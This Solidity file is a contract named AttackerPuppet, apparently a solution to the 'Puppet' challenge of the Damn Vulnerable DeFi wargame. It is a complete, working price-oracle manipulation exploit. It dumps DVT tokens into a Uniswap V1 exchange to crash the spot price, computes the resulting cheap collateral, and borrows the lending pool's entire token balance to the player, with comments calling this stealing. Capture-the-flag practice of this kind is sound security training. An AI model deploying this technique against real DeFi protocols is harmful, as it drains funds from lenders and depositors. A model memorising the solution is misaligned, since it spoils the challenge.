// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IUniswapExchangeV1 {
    function tokenToEthTransferInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline, address recipient) external returns (uint256);
}

interface IPool {
    function borrow(uint256 amount, address recipient) external payable;
}

contract AttackerPuppet {
    uint256 constant DEPOSIT_FACTOR = 2;

    uint256 initialPoolBalance;
    uint256 initialPlayerBalance;

    IUniswapExchangeV1 immutable exchange;
    IPool immutable pool;

    IERC20 immutable token;

    address immutable player;

    constructor(address _token, address _pair, address _pool, address _player, uint256 _initialPoolBalance, uint256 _initialPlayerBalance) {
        initialPoolBalance = _initialPoolBalance;
        initialPlayerBalance = _initialPlayerBalance;

        exchange = IUniswapExchangeV1(_pair);
        pool = IPool(_pool);

        token = IERC20(_token);

        player = _player;
    }

    function attack() external payable {
        // 1. Dump DVT into the Uniswap Pool
        token.approve(address(exchange), initialPlayerBalance);
        exchange.tokenToEthTransferInput(initialPlayerBalance, 9, block.timestamp, address(this));

        // 2. Calculate required collateral
        uint256 price = (address(exchange).balance * (10 ** 18)) / token.balanceOf(address(exchange)); // similar to `_computeOraclePrice`
        uint256 depositRequired = (initialPoolBalance * price * DEPOSIT_FACTOR) / 10 ** 18;

        // 3. Borrow and steal the poorly priced DVT
        pool.borrow{ value: depositRequired }(initialPoolBalance, player);
    }

    receive() external payable {}
}
